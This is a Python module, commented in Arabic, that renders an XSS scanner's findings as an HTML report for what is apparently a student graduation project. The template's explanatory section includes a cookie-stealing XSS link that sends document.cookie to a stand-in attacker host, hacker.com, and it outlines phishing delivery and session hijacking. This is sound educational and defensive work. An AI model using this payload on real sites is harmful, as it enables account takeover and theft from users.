#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
وحدة مُنشئ التقرير (Reporter)
تحوّل نتائج الفحص إلى ملف HTML جميل.
"""

import html
from datetime import datetime


HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>تقرير فحص XSS</title>
<style>
* {{ box-sizing: border-box; margin: 0; padding: 0; }}
body {{ font-family: 'Segoe UI', sans-serif; background: #f4f6f9; color: #333; padding: 20px; line-height: 1.7; }}
.container {{ max-width: 1100px; margin: 0 auto; }}
header {{ background: linear-gradient(135deg, #2c3e50, #4a6741); color: white; padding: 30px; border-radius: 12px; margin-bottom: 25px; text-align: center; }}
header h1 {{ font-size: 28px; margin-bottom: 10px; }}
.card {{ background: white; border-radius: 12px; padding: 25px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); }}
.card h2 {{ color: #2c3e50; border-bottom: 2px solid #eee; padding-bottom: 12px; margin-bottom: 18px; font-size: 20px; }}
.stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; }}
.stat-box {{ padding: 20px; border-radius: 10px; text-align: center; color: white; }}
.stat-box .num {{ font-size: 32px; font-weight: bold; }}
.stat-total {{ background: #3498db; }}
.stat-critical {{ background: #c0392b; }}
.stat-high {{ background: #e67e22; }}
.stat-low {{ background: #27ae60; }}
table {{ width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 14px; }}
th, td {{ padding: 12px; text-align: right; border-bottom: 1px solid #eee; word-break: break-all; }}
th {{ background: #2c3e50; color: white; font-weight: normal; }}
code {{ background: #f4f4f4; padding: 3px 8px; border-radius: 4px; font-family: 'Consolas', monospace; font-size: 13px; color: #c0392b; direction: ltr; display: inline-block; }}
.badge {{ display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; color: white; }}
.badge-critical {{ background: #c0392b; }}
.badge-high {{ background: #e67e22; }}
.badge-low {{ background: #27ae60; }}
.response-snippet {{ background: #1e1e1e; color: #4ec9b0; padding: 15px; border-radius: 6px; font-family: 'Consolas', monospace; font-size: 12px; direction: ltr; text-align: left; overflow: auto; max-height: 250px; margin-top: 8px; white-space: pre-wrap; word-break: break-all; border-left: 3px solid #f39c12; }}
.no-vulns {{ text-align: center; padding: 40px; color: #27ae60; font-size: 18px; }}
.attack-scenario {{ padding-right: 25px; line-height: 2; }}
.attack-scenario li {{ margin-bottom: 12px; }}
.attack-scenario code {{ margin: 5px 0; }}
.warning-box {{ margin-top: 20px; padding: 15px; background: #fef3c7; border-right: 4px solid #f59e0b; border-radius: 6px; }}
footer {{ text-align: center; color: #888; padding: 20px; font-size: 13px; }}
</style>
</head>
<body>
<div class="container">
<header>
<h1>🛡️ تقرير فحص ثغرات XSS</h1>
<p>{tool_name} v{version} - Pure Python XSS Scanner</p>
</header>

<div class="card">
<h2>📋 معلومات الفحص</h2>
<table>
<tr><th style="width: 30%;">الرابط المستهدف</th><td><code>{target_url}</code></td></tr>
<tr><th>تاريخ الفحص</th><td>{scan_date}</td></tr>
<tr><th>عدد النماذج المكتشفة</th><td>{forms_count}</td></tr>
<tr><th>عدد الحمولات المُرسلة</th><td>{payloads_count}</td></tr>
<tr><th>عدد الثغرات المكتشفة</th><td><strong>{vulns_count}</strong></td></tr>
</table>
</div>

<div class="card">
<h2>📊 ملخص النتائج</h2>
<div class="stats">
<div class="stat-box stat-total"><div class="num">{vulns_count}</div><div>الإجمالي</div></div>
<div class="stat-box stat-critical"><div class="num">{critical_count}</div><div>حرجة</div></div>
<div class="stat-box stat-high"><div class="num">{high_count}</div><div>عالية</div></div>
<div class="stat-box stat-low"><div class="num">{low_count}</div><div>منخفضة</div></div>
</div>
</div>

<div class="card">
<h2>🔍 تفاصيل الثغرات</h2>
{vulns_table}
</div>

<div class="card">
<h2>💀 السيناريو الحقيقي للهجوم (الطبقة 2)</h2>
<p style="margin-bottom: 20px; color: #555; font-size: 15px;">
<strong>المهاجم لا يكتب الحمولة في DVWA مباشرة. هو يفعل شيئاً مختلفاً تماماً:</strong>
</p>

<ol class="attack-scenario">
<li>
<strong>المهاجم يبني موقعاً مزيفاً</strong> (صفحة تسجيل دخول مزيفة تشبه موقع البنك).
</li>

<li>
<strong>المهاجم يصنع رابطاً مشبوهاً:</strong>
<br>
<code>http://bank.com/login?name=&lt;script&gt;document.location='http://hacker.com/steal.php?c='+document.cookie&lt;/script&gt;</code>
</li>

<li>
<strong>المهاجم يرسل الرابط للضحية عبر:</strong>
<ul style="margin-top: 8px; padding-right: 20px;">
<li>إيميل تصيّد ("تم إلغاء حسابك، اضغط هنا").</li>
<li>رسالة SMS.</li>
<li>منشور على فيسبوك.</li>
<li>رسالة واتساب.</li>
</ul>
</li>

<li>
<strong>الضحية (أنت) تضغط الرابط:</strong>
<ul style="margin-top: 8px; padding-right: 20px;">
<li>يفتح المتصفح صفحة البنك الحقيقية.</li>
<li>لكن الـ URL يحتوي على الكود الخبيث.</li>
<li>البنك (المصاب) يعرض الكود في HTML.</li>
<li>المتصفح ينفذ الكود.</li>
<li>الكود يرسل كوكي جلسة البنك إلى <code>hacker.com/steal.php</code>.</li>
</ul>
</li>

<li>
<strong>المهاجم يستلم الكوكي:</strong>
<br>
<code>PHPSESSID=abc123</code><br>
<code>bank_session=xyz789</code><br>
<code>user_id=12345</code>
</li>

<li>
<strong>المهاجم يضع الكوكي في متصفحه:</strong>
<ul style="margin-top: 8px; padding-right: 20px;">
<li>يفتح متصفح جديد.</li>
<li>يستخدم إضافة مثل "EditThisCookie".</li>
<li>يضع الكوكي المسروق.</li>
<li>يفتح موقع البنك.</li>
<li><strong>البنك يعتقد أن المهاجم هو الضحية!</strong></li>
<li><strong>المهاجم يدخل حساب البنك بدون كلمة مرور.</strong></li>
<li><strong>يحوّل كل الأموال لحسابه.</strong></li>
</ul>
</li>
</ol>

<div class="warning-box">
<strong>💀 هذا هو الهجوم الحقيقي.</strong><br>
<strong>⚠️ الهدف من الفحص:</strong> اكتشاف الثغرات <strong>قبل</strong> أن يستغلها المهاجمون.
</div>
</div>

<footer>تم إنشاء هذا التقرير بواسطة {tool_name} v{version} - مشروع تخرج</footer>
</div>
</body>
</html>
"""


def get_badge_class(severity):
    s = severity.lower()
    if 'حرجة' in s or 'critical' in s:
        return 'badge-critical'
    elif 'عالية' in s or 'high' in s:
        return 'badge-high'
    return 'badge-low'


def escape(text):
    if not text:
        return ''
    return html.escape(str(text))


def truncate(text, max_len=500):
    if not text:
        return '(لا يوجد رد)'
    text = str(text)
    if len(text) <= max_len:
        return text
    return text[:max_len] + f'\n\n... [تم قطع النص، الحجم الأصلي: {len(text)}]'


def generate_report(target_url, vulnerabilities, output_file='report.html',
                    forms_count=0, payloads_count=0,
                    tool_name='XSStrike-Lite', version='1.0.0'):
    vulns_count = len(vulnerabilities)
    critical_count = sum(1 for v in vulnerabilities if 'حرجة' in v['analysis']['severity'])
    high_count = sum(1 for v in vulnerabilities
                     if 'عالية' in v['analysis']['severity']
                     and 'حرجة' not in v['analysis']['severity'])
    low_count = vulns_count - critical_count - high_count

    if vulnerabilities:
        rows = []
        for i, v in enumerate(vulnerabilities, 1):
            analysis = v['analysis']
            context = analysis.get('reflection', {}).get('context', 'غير معروف')
            response_snippet = truncate(v.get('response', ''), 500)
            badge_class = get_badge_class(analysis['severity'])

            rows.append(f"""
<tr><td>{i}</td><td><code>{escape(v['payload'])}</code></td>
<td><span class="badge {badge_class}">{escape(analysis['severity'])}</span></td>
<td>{escape(context)}</td><td>{v.get('status', 'N/A')}</td></tr>
<tr><td colspan="5"><details><summary style="cursor:pointer;color:#3498db;">عرض مقتطف من الرد</summary>
<div class="response-snippet">{escape(response_snippet)}</div></details></td></tr>
""")
        vulns_table = '<table><thead><tr><th>#</th><th>الحمولة</th><th>الخطورة</th><th>السياق</th><th>الحالة</th></tr></thead><tbody>' + ''.join(rows) + '</tbody></table>'
    else:
        vulns_table = '<div class="no-vulns">✅ لم يتم اكتشاف أي ثغرات XSS</div>'

    html_content = HTML_TEMPLATE.format(
        tool_name=escape(tool_name), version=escape(version),
        target_url=escape(target_url),
        scan_date=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        forms_count=forms_count, payloads_count=payloads_count,
        vulns_count=vulns_count, critical_count=critical_count,
        high_count=high_count, low_count=low_count, vulns_table=vulns_table
    )

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(html_content)

    return output_file